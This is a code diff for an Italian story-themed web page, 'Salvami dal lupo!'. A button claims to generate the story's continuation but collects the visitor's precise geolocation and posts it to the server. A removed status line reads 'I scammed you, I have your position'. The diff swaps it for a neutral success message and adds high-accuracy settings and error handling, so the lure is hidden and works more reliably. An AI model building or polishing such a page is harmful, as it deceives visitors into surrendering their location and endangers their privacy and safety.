@@ -56,32 +56,53 @@ Salvami dal lupo!
 
       share.addEventListener("click", () => {
         if (!consent.checked) return;
+        if (!window.isSecureContext) {
+          status.textContent = "La geolocalizzazione richiede una connessione HTTPS.";
+          return;
+        }
         if (!navigator.geolocation) {
           status.textContent = "La geolocalizzazione non è supportata.";
           return;
         }
 
         status.textContent = "Generando il continuo della storia...";
-        navigator.geolocation.getCurrentPosition(async (position) => {
-          try {
-            const response = await fetch("/share-location", {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude,
-                accuracy: position.coords.accuracy
-              })
-            });
-            const result = await response.json();
-            if (!response.ok) throw new Error(result.error || "Invio non riuscito.");
-            status.textContent = "GODO TI HO SCAMMATO HO LA TUA POSIZIONE";
-          } catch (error) {
-            status.textContent = error.message || "Errore durante l'invio.";
+        share.disabled = true;
+        navigator.geolocation.getCurrentPosition(
+          async (position) => {
+            try {
+              const response = await fetch("/share-location", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy
+                })
+              });
+              const result = await response.json();
+              if (!response.ok) throw new Error(result.error || "Invio non riuscito.");
+              status.textContent = "Posizione condivisa correttamente.";
+            } catch (error) {
+              status.textContent = error.message || "Errore durante l'invio.";
+            } finally {
+              share.disabled = !consent.checked;
+            }
+          },
+          (error) => {
+            const messages = {
+              1: "Permesso di posizione negato. Consenti la posizione nelle impostazioni del browser.",
+              2: "La posizione non è disponibile. Verifica GPS o posizione del dispositivo.",
+              3: "Richiesta della posizione scaduta. Riprova."
+            };
+            status.textContent = messages[error.code] || "Impossibile ottenere la posizione.";
+            share.disabled = !consent.checked;
+          },
+          {
+            enableHighAccuracy: true,
+            timeout: 15000,
+            maximumAge: 60000
           }
-        }, (error) => {
-          status.textContent = error.message || "Impossibile ottenere la posizione.";
-        });
+        );
       });
     </script>
   </body>
